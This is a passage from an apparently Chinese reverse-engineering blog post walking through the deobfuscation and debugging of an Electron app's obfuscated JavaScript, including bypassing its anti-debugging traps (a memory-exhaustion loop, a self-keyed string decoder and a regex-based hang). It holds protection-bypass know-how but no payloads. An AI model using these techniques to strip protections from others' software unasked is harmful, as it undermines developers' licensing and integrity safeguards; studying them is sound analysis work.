path.<span class="hljs-property">node</span>.<span class="hljs-property">value</span><br>        path.<span class="hljs-title function_">replaceWith</span>(<span class="hljs-title class_">NumericLiteral</span>(value))<br>        path.<span class="hljs-title function_">skip</span>()<br><br>    &#125;<br><br>&#125;)<br><br><span class="hljs-keyword">let</span> code = <span class="hljs-title function_">generator</span>(ast).<span class="hljs-property">code</span> <span class="hljs-comment">//生成处理后的ast代码</span><br>fs.<span class="hljs-title function_">writeFileSync</span>(<span class="hljs-string">&#x27;2.js&#x27;</span>,code,&#123;<span class="hljs-attr">encoding</span>:<span class="hljs-string">&quot;utf-8&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>替换之后的<code>2.js</code>文件内容为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs javascript">(<span class="hljs-keyword">function</span> (<span class="hljs-params">_0x2c2b00, _0x266f24</span>) &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-params">_0x5c6e5d, _0x2e5990, _0x92ffbf, _0xd034a8, _0x357357</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x2428</span>(_0x357357 - -<span class="hljs-number">135</span>, _0x2e5990);<br>  &#125;<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x245656</span>(<span class="hljs-params">_0x3c14a2, _0xf20f43, _0x684d2f, _0xbe1a9a, _0x4c1a31</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x2428</span>(_0xbe1a9a - <span class="hljs-number">926</span>, _0x4c1a31);<br>  &#125;<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0xf3f8ba</span>(<span class="hljs-params">_0x3bb4fe, _0x3abbcb, _0x5b1533, _0x12f9ce, _0x428add</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x2428</span>(_0x12f9ce - <span class="hljs-number">910</span>, _0x3abbcb);<br>  &#125;<br><br>  <span class="hljs-keyword">var</span> _0x17d610 = <span class="hljs-title function_">_0x2c2b00</span>();<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x3d68b3</span>(<span class="hljs-params">_0x2076a7, _0x106168, _0x234a88, _0x360ccc, _0x461c10</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x2428</span>(_0x234a88 - -<span class="hljs-number">436</span>, _0x360ccc);<br>  &#125;<br><br>  <span class="hljs-keyword">while</span> (!![]) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">var</span> _0x277bc2 = <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">469</span>, <span class="hljs-string">&quot;Z7Gm&quot;</span>, <span class="hljs-number">615</span>, <span class="hljs-number">433</span>, <span class="hljs-number">561</span>)) / <span class="hljs-number">1</span> + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">548</span>, <span class="hljs-string">&quot;$j83&quot;</span>, <span class="hljs-number">396</span>, <span class="hljs-number">382</span>, <span class="hljs-number">529</span>)) / <span class="hljs-number">2</span> + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">597</span>, <span class="hljs-string">&quot;@wx(&quot;</span>, <span class="hljs-number">513</span>, <span class="hljs-number">633</span>, <span class="hljs-number">511</span>)) / <span class="hljs-number">3</span> * (-<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">666</span>, <span class="hljs-string">&quot;4dg3&quot;</span>, <span class="hljs-number">764</span>, <span class="hljs-number">677</span>, <span class="hljs-number">595</span>)) / <span class="hljs-number">4</span>) + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3d68b3</span>(<span class="hljs-number">203</span>, <span class="hljs-number">43</span>, <span class="hljs-number">182</span>, <span class="hljs-string">&quot;l@Ju&quot;</span>, <span class="hljs-number">330</span>)) / <span class="hljs-number">5</span> + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">344</span>, <span class="hljs-string">&quot;gRrO&quot;</span>, <span class="hljs-number">220</span>, <span class="hljs-number">494</span>, <span class="hljs-number">307</span>)) / <span class="hljs-number">6</span> + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">230</span>, <span class="hljs-string">&quot;A89h&quot;</span>, <span class="hljs-number">304</span>, <span class="hljs-number">188</span>, <span class="hljs-number">333</span>)) / <span class="hljs-number">7</span> * (<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x245656</span>(<span class="hljs-number">1324</span>, <span class="hljs-number">1324</span>, <span class="hljs-number">1581</span>, <span class="hljs-number">1507</span>, <span class="hljs-string">&quot;yAJx&quot;</span>)) / <span class="hljs-number">8</span>) + -<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0xf3f8ba</span>(<span class="hljs-number">1484</span>, <span class="hljs-string">&quot;AfM(&quot;</span>, <span class="hljs-number">1551</span>, <span class="hljs-number">1545</span>, <span class="hljs-number">1397</span>)) / <span class="hljs-number">9</span> * (<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x495d9e</span>(<span class="hljs-number">542</span>, <span class="hljs-string">&quot;lz)0&quot;</span>, <span class="hljs-number">480</span>, <span class="hljs-number">213</span>, <span class="hljs-number">370</span>)) / <span class="hljs-number">10</span>);<br><br>      <span class="hljs-keyword">if</span> (_0x277bc2 === _0x266f24) <span class="hljs-keyword">break</span>;<span class="hljs-keyword">else</span> _0x17d610[<span class="hljs-string">&quot;push&quot;</span>](_0x17d610[<span class="hljs-string">&quot;shift&quot;</span>]());<br>    &#125; <span class="hljs-keyword">catch</span> (_0x546e2a) &#123;<br>      _0x17d610[<span class="hljs-string">&quot;push&quot;</span>](_0x17d610[<span class="hljs-string">&quot;shift&quot;</span>]());<br>    &#125;<br>  &#125;<br>&#125;)(_0x4a83, <span class="hljs-number">136159</span>);<br><br><span class="hljs-comment">//.......</span><br><span class="hljs-comment">//以下部分省略，具体结果上手操作可以得到</span><br></code></pre></td></tr></table></figure><h2 id="0x04-绕过反调试机制">0x04 绕过反调试机制</h2><p>通过上节方法解混淆之后，可以得到一个可读性稍强的代码，这时候就可以开始调试了。但是程序设计者肯定不会让我们这么顺利的调试的，往往在混淆的过程中加一些反调试机制，也就是暗桩。</p><p>这时候就需要秉持着一个原则：</p><ol><li>大函数之间下断点</li><li>函数内，代码多的函数先步过（一口气走完跳过）</li><li>直到出现异常情况（程序崩溃、大量循环），开始分析暗桩</li></ol><p>第一点还是比较好理解的，因为在程序中，往往是从上向下执行。如果一个JS文件中有四个函数，可以先在AB函数之间写个<code>console.log</code>，看是否输出，如果程序异常且无输出，说明A函数存在暗桩。</p><blockquote><p>注：JavaScript存在<strong>声明提升</strong>机制，更多说明与利用见龙哥博客：<a href="https://somebodynostation.com/archives/javascript-sheng-ming-ti-sheng">【Javascript】声明提升 - SomebodyNoStation</a></p></blockquote><p>第二、三点，就是常规调试操作，没出现异常就步过，出现异常就步进，直至确认异常出现在哪行代码中。在这里，先从<code>_0x2428</code>函数之前加个<code>console.log</code>，投石问路：</p><p><img src="/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/image-20220628200057504.png" alt></p><p>看图可知，程序执行完毕跳出且没有打印控制台命令。也就是说程序并没有执行完所有的语句就退出了，可能存在反调试机制……</p><h4 id="内存爆破">内存爆破</h4><p>从<code>var _0x277bc2</code>处打断点，程序运行到此处暂停，步过后停止。也就是说反调试存在此行子函数中。继续调试，暂停到此行后步入，发现以下代码较为可疑：</p><p><img src="/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/image-20220628200502035.png" alt></p><p>首先<code>_0x24ecd3</code>匹配了两个正则表达式，具体匹配的什么先不管~~（其实是看不懂）~~，看下面的103行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">_0x32c41e = _0x24ecd3[<span class="hljs-string">&quot;test&quot;</span>](<span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;myBoDO&quot;</span>][<span class="hljs-string">&quot;toString&quot;</span>]()) ? --<span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;RfnWOy&quot;</span>][<span class="hljs-number">1</span>] : --<span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;RfnWOy&quot;</span>][<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>这里对<code>this[&quot;myBoDO&quot;][&quot;toString&quot;]()</code>进行了匹配正则，也就是对<code>function () &#123;return &quot;newState&quot;;</code>的格式化后的字符串进行了正则匹配，如果匹配成功则返回-1，匹配不成功则返回0。最后该函数带参数返回<code>this[&quot;CugJBF&quot;](_0x32c41e)</code>。</p><blockquote><p><code>this[&quot;myBoDO&quot;][&quot;toString&quot;]()</code>也可以写成<code>this[&quot;myBoDO&quot;]+''</code>的形式，语义不会发生改变。</p></blockquote><p>而在下面的函数中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">_0x3b755e[<span class="hljs-string">&quot;prototype&quot;</span>][<span class="hljs-string">&quot;CugJBF&quot;</span>] = <span class="hljs-keyword">function</span> (<span class="hljs-params">_0x893c54</span>) &#123;<br>          <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Boolean</span>(~_0x893c54)) <span class="hljs-keyword">return</span> _0x893c54;<br>          <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;RzzIoo&quot;</span>](<span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;xdQAnv&quot;</span>]);<br>        &#125;,<br></code></pre></td></tr></table></figure><p>已知传入参数只有-1和0，这样我们可以直接从控制台中打印最后的结果：</p><p><img src="/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/image-20220629143050212.png" alt></p><p>当传入值为-1时，也就是正则匹配成功时才会直接返回-1，否则不成功的话会接着运行<code>return this[&quot;RzzIoo&quot;](this[&quot;xdQAnv&quot;])</code>。</p><p>现在看一下这个函数究竟是个什么东西，这里的代码使用JSNICE反混淆后的代码，更容易阅读。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">WMCacheControl</span>[<span class="hljs-string">&quot;prototype&quot;</span>][<span class="hljs-string">&quot;RzzIoo&quot;</span>] = <span class="hljs-keyword">function</span>(<span class="hljs-params">saveNotifs</span>) &#123;<br>    <span class="hljs-keyword">var</span> fp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">var</span> len = <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;RfnWOy&quot;</span>][<span class="hljs-string">&quot;length&quot;</span>];<br>    <span class="hljs-keyword">for</span> (; fp &lt; len; fp++) &#123;<br>        <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;RfnWOy&quot;</span>][<span class="hljs-string">&quot;push&quot;</span>](<span class="hljs-title class_">Math</span>[<span class="hljs-string">&quot;round&quot;</span>](<span class="hljs-title class_">Math</span>[<span class="hljs-string">&quot;random&quot;</span>]())); <span class="hljs-comment">//push--判断数组</span><br>        len = <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;RfnWOy&quot;</span>][<span class="hljs-string">&quot;length&quot;</span>]; <span class="hljs-comment">//一直循环，内存爆破</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">saveNotifs</span>(<span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;RfnWOy&quot;</span>][<span class="hljs-number">0</span>]);<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里简单来说就是不断生成随机数，并加入到数组中；<strong>虽然fp是每次循环都+1，但是数组的长度也是不断增长的，所以这个循环根本就不会停止</strong>。而储存在内存里的数组元素也是不断增长的，所以就会实现一个内存爆破的效果。</p><p>更直观的图片可以直接看下图：</p><p><img src="/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/image-20220629145015131.png" alt></p><p>至于绕过方法，有很多种，其实原理都是一样的，不要让他爆破就行了：</p><ol><li>105行直接返回值改true；</li><li>调换103行-1和0的结果值；</li><li>直接删除掉内存爆破函数；</li><li>……</li></ol><h4 id="函数编码表">函数编码表</h4><p>解决完内存爆破的问题后，在调试过程中不会异常退出了，但会出现程序在很长时间都一直运行的问题……说明程序陷入了某个循环或调用链中，需要再次进行调试。通过打断点发现，出问题的存在<code>_0x2428(row, value)</code>函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x2428</span>(<span class="hljs-params">row, value</span>) &#123;<br>  <span class="hljs-keyword">var</span> custom_filters = <span class="hljs-title function_">_0x4a83</span>();<br>  <span class="hljs-keyword">return</span> _0x2428 = <span class="hljs-keyword">function</span>(<span class="hljs-params">i, value</span>) &#123;<br>    i = i - <span class="hljs-number">373</span>;<br>    <span class="hljs-keyword">var</span> text = custom_filters[i];<br>    <span class="hljs-keyword">if</span> (_0x2428[<span class="hljs-string">&quot;oNYHMO&quot;</span>] === <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-keyword">var</span> getOwnPropertyNames = <span class="hljs-keyword">function</span>(<span class="hljs-params">o</span>) &#123;<br>        <span class="hljs-keyword">var</span> listeners = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">PL</span>$13 = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">var</span> urn = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">var</span> data = <span class="hljs-variable constant_">PL</span>$13 + getOwnPropertyNames;<br>        <span class="hljs-keyword">var</span> bc = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">var</span> bs;<br>        <span class="hljs-keyword">var</span> buffer;<br>        <span class="hljs-keyword">var</span> n = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (; buffer = o[<span class="hljs-string">&quot;charAt&quot;</span>](n++); ~buffer &amp;&amp; (bs = bc % <span class="hljs-number">4</span> ? bs * <span class="hljs-number">64</span> + buffer : buffer, bc++ % <span class="hljs-number">4</span>) ? <span class="hljs-variable constant_">PL</span>$13 = <span class="hljs-variable constant_">PL</span>$13 + (data[<span class="hljs-string">&quot;charCodeAt&quot;</span>](n + <span class="hljs-number">10</span>) - <span class="hljs-number">10</span> !== <span class="hljs-number">0</span> ? <span class="hljs-title class_">String</span>[<span class="hljs-string">&quot;fromCharCode&quot;</span>](<span class="hljs-number">255</span> &amp; bs &gt;&gt; (-<span class="hljs-number">2</span> * bc &amp; <span class="hljs-number">6</span>)) : bc) : <span class="hljs-number">0</span>) &#123;<br>          buffer = listeners[<span class="hljs-string">&quot;indexOf&quot;</span>](buffer);<br>        &#125;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">PL</span>$19 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">PL</span>$15 = <span class="hljs-variable constant_">PL</span>$13[<span class="hljs-string">&quot;length&quot;</span>];<br>        <span class="hljs-keyword">for</span> (; <span class="hljs-variable constant_">PL</span>$19 &lt; <span class="hljs-variable constant_">PL</span>$15; <span class="hljs-variable constant_">PL</span>$19++) &#123;<br>          urn = urn + (<span class="hljs-string">&quot;%&quot;</span> + (<span class="hljs-string">&quot;00&quot;</span> + <span class="hljs-variable constant_">PL</span>$13[<span class="hljs-string">&quot;charCodeAt&quot;</span>](<span class="hljs-variable constant_">PL</span>$19)[<span class="hljs-string">&quot;toString&quot;</span>](<span class="hljs-number">16</span>))[<span class="hljs-string">&quot;slice&quot;</span>](-<span class="hljs-number">2</span>));<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">decodeURIComponent</span>(urn);<br>      &#125;;<br><span class="hljs-comment">//........</span><br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的一点，在<code>var data=PL$13 + getOwnPropertyNames;</code>这个语句中，实际上就是<code>var data=getOwnPropertyNames+''</code>。它会把<code>getOwnPropertyNames</code>这个函数以字符串的形式储存在<code>data</code>中。而在<code>(data[&quot;charCodeAt&quot;](n + 10) - 10 !== 0 ? String[&quot;fromCharCode&quot;](255 &amp; bs &gt;&gt; (-2 * bc &amp; 6)) : bc) : 0)</code>，发现了程序在对<code>data</code>进行数据操作，可以初步确定该函数是以其字符串化的数据为码表，进行编解码的。</p><p><strong>但这里需要注意：经过测试，使用<code>JSNICE</code>解混淆后的代码是没法过函数码表调试的，因为解码后的函数和变量被重新命名，语义发生了改变。</strong></p><p>所以这里需要使用<code>AST树</code>反混淆后的代码进行绕过：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (_0x2428[<span class="hljs-string">&quot;oNYHMO&quot;</span>] === <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-keyword">var</span> _0x2428bb = <span class="hljs-keyword">function</span> (<span class="hljs-params">_0xdad3f3</span>) &#123;<span class="hljs-keyword">var</span> _0x322eb2=<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=&quot;</span>;<span class="hljs-keyword">var</span> _0x42cc1a=<span class="hljs-string">&quot;&quot;</span>,_0x3bd1d2=<span class="hljs-string">&quot;&quot;</span>,_0x20b060=_0x42cc1a+_0x2428bb;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> _0x140781 = <span class="hljs-number">0</span>, _0x3b67a1, _0x2ed931, _0x43927d = <span class="hljs-number">0</span>; _0x2ed931 = _0xdad3f3[<span class="hljs-string">&quot;charAt&quot;</span>](_0x43927d++); ~_0x2ed931 &amp;&amp; (_0x3b67a1 = _0x140781 % <span class="hljs-number">4</span> ? _0x3b67a1 * <span class="hljs-number">64</span> + _0x2ed931 : _0x2ed931, _0x140781++ % <span class="hljs-number">4</span>) ? _0x42cc1a += _0x20b060[<span class="hljs-string">&quot;charCodeAt&quot;</span>](_0x43927d + <span class="hljs-number">10</span>) - <span class="hljs-number">10</span> !== <span class="hljs-number">0</span> ? <span class="hljs-title class_">String</span>[<span class="hljs-string">&quot;fromCharCode&quot;</span>](<span class="hljs-number">255</span> &amp; _0x3b67a1 &gt;&gt; (-<span class="hljs-number">2</span> * _0x140781 &amp; <span class="hljs-number">6</span>)) : _0x140781 : <span class="hljs-number">0</span>) &#123;<br>          _0x2ed931 = _0x322eb2[<span class="hljs-string">&quot;indexOf&quot;</span>](_0x2ed931);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> _0x4d79cc = <span class="hljs-number">0</span>, _0x149750 = _0x42cc1a[<span class="hljs-string">&quot;length&quot;</span>]; _0x4d79cc &lt; _0x149750; _0x4d79cc++) &#123;<br>          _0x3bd1d2 += <span class="hljs-string">&quot;%&quot;</span> + (<span class="hljs-string">&quot;00&quot;</span> + _0x42cc1a[<span class="hljs-string">&quot;charCodeAt&quot;</span>](_0x4d79cc)[<span class="hljs-string">&quot;toString&quot;</span>](<span class="hljs-number">16</span>))[<span class="hljs-string">&quot;slice&quot;</span>](-<span class="hljs-number">2</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">decodeURIComponent</span>(_0x3bd1d2);<br>      &#125;;<br></code></pre></td></tr></table></figure><p>因为在JS代码未格式化之前，所有的语句都是尽量连在一起的，所以在这里我们需要去掉语句之间的空格。再次调试后会发现已经绕过了函数码表，面对我们的是最后一个障碍……</p><p><img src="/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/image-20220629195929782.png" alt></p><h4 id="拒绝服务">拒绝服务</h4><p>绕过函数码表后，还是不断打断点进行调试，发现程序运行到<code>_0x3cd8b0()</code>后卡死。继续在<code>_0x3cd8b0()</code>打断点，F11步入到<code>var _0x5a2da4</code>中。按照调试的原则，直到出异常后重新打断点步入。发现在下面代码中无响应：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> _0x223952 = _0x4ad3cf[<span class="hljs-title function_">_0x1b6697</span>(<span class="hljs-string">&quot;Q[uh&quot;</span>, <span class="hljs-number">338</span>, <span class="hljs-number">440</span>, <span class="hljs-number">475</span>, <span class="hljs-number">346</span>)](_0x425e28, <span class="hljs-variable language_">arguments</span>);<br></code></pre></td></tr></table></figure><p>打断点，停止程序，重新调试。运行到该步时，对该行三个子函数全打断点后步过，发现前两个顺利步过，由此可知<code>_0x425e28</code>处存在暗桩：</p><p><img src="/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/image-20220629202925702.png" alt></p><p>之后f11步入到<code>var _0x377802</code>，步过一次，发现到了<code>return</code>，一堆子函数，依然是全打断点步过：</p><p><img src="/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/image-20220629203216873.png" alt></p><p>调试到<code>_0x377802</code>处卡死，这时候猛地发现：这个<code>_0x3cd8b0()</code>在return处也有……继续分析<code>_0x3cd8b0()</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js">  _0x3cd8b0 = <span class="hljs-title function_">_0x384e83</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x1db718</span>(<span class="hljs-params">_0x5b392e, _0x43b334, _0x2e2186, _0x51608b, _0x1e40ec</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x2428</span>(_0x51608b - <span class="hljs-number">418</span>, _0x2e2186);<br>  &#125;<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x5852f4</span>(<span class="hljs-params">_0x879a90, _0x1557ee, _0xa232dd, _0x533bbc, _0x32f796</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x2428</span>(_0x879a90 - <span class="hljs-number">467</span>, _0x32f796);<br>  &#125;<br><br>  <span class="hljs-keyword">var</span> _0x377802 = &#123;<br>    <span class="hljs-string">&quot;uawfM&quot;</span>: <span class="hljs-title function_">_0x5bc29b</span>(-<span class="hljs-number">299</span>, -<span class="hljs-number">136</span>, -<span class="hljs-number">166</span>, -<span class="hljs-number">154</span>, <span class="hljs-string">&quot;pf7m&quot;</span>) + <span class="hljs-title function_">_0x5bc29b</span>(-<span class="hljs-number">337</span>, -<span class="hljs-number">265</span>, -<span class="hljs-number">385</span>, -<span class="hljs-number">263</span>, <span class="hljs-string">&quot;tR1%&quot;</span>) + <span class="hljs-string">&quot;+$&quot;</span><br>  &#125;;<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x2129cf</span>(<span class="hljs-params">_0xb35e3c, _0x58b231, _0x3ea525, _0x3dfb26, _0x54f224</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x2428</span>(_0x54f224 - -<span class="hljs-number">299</span>, _0x58b231);<br>  &#125;<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x5bc29b</span>(<span class="hljs-params">_0x29383b, _0x2783c2, _0xab345a, _0x222ff3, _0x444bd3</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x2428</span>(_0x222ff3 - -<span class="hljs-number">662</span>, _0x444bd3);<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> _0x3cd8b0[<span class="hljs-title function_">_0x5bc29b</span>(-<span class="hljs-number">310</span>, -<span class="hljs-number">327</span>, -<span class="hljs-number">203</span>, -<span class="hljs-number">271</span>, <span class="hljs-string">&quot;PVAS&quot;</span>) + <span class="hljs-title function_">_0x2129cf</span>(<span class="hljs-number">526</span>, <span class="hljs-string">&quot;IVdS&quot;</span>, <span class="hljs-number">443</span>, <span class="hljs-number">392</span>, <span class="hljs-number">439</span>)]()[<span class="hljs-title function_">_0x5852f4</span>(<span class="hljs-number">989</span>, <span class="hljs-number">1150</span>, <span class="hljs-number">955</span>, <span class="hljs-number">1088</span>, <span class="hljs-string">&quot;l@Ju&quot;</span>) + <span class="hljs-string">&quot;h&quot;</span>](_0x377802[<span class="hljs-title function_">_0x5bc29b</span>(<span class="hljs-number">84</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">69</span>, <span class="hljs-number">79</span>, <span class="hljs-string">&quot;u4os&quot;</span>)])[<span class="hljs-title function_">_0x2129cf</span>(<span class="hljs-number">279</span>, <span class="hljs-string">&quot;uiYA&quot;</span>, <span class="hljs-number">254</span>, <span class="hljs-number">247</span>, <span class="hljs-number">428</span>) + <span class="hljs-title function_">_0x5bc29b</span>(-<span class="hljs-number">229</span>, <span class="hljs-number">25</span>, -<span class="hljs-number">135</span>, -<span class="hljs-number">55</span>, <span class="hljs-string">&quot;PVAS&quot;</span>)]()[<span class="hljs-title function_">_0x5852f4</span>(<span class="hljs-number">1087</span>, <span class="hljs-number">1013</span>, <span class="hljs-number">946</span>, <span class="hljs-number">1105</span>, <span class="hljs-string">&quot;lz)0&quot;</span>) + <span class="hljs-title function_">_0x5bc29b</span>(<span class="hljs-number">208</span>, <span class="hljs-number">101</span>, <span class="hljs-number">98</span>, <span class="hljs-number">21</span>, <span class="hljs-string">&quot;lz)0&quot;</span>) + <span class="hljs-string">&quot;r&quot;</span>](_0x3cd8b0)[<span class="hljs-title function_">_0x2129cf</span>(<span class="hljs-number">285</span>, <span class="hljs-string">&quot;b#3e&quot;</span>, <span class="hljs-number">379</span>, <span class="hljs-number">555</span>, <span class="hljs-number">433</span>) + <span class="hljs-string">&quot;h&quot;</span>](_0x377802[<span class="hljs-title function_">_0x5bc29b</span>(-<span class="hljs-number">93</span>, -<span class="hljs-number">192</span>, -<span class="hljs-number">239</span>, -<span class="hljs-number">277</span>, <span class="hljs-string">&quot;)Ua$&quot;</span>)]);<br>&#125;);<br></code></pre></td></tr></table></figure><p>发现存在四个子函数，但是最后都返回调用了<code>_0x2428</code>，而<code>_0x2428</code>恰恰是上步我们研究码表时的函数，猜测主要起解码的作用。这里也可以大致猜到，<code>_0x3cd8b0</code>不断嵌套调用解码函数，起到了一个拒绝服务的作用。但具体表示什么含义呢？不妨先将方括号里的参数用控制台打印输出一下：</p><figure class="highlight js"><table><tr><td 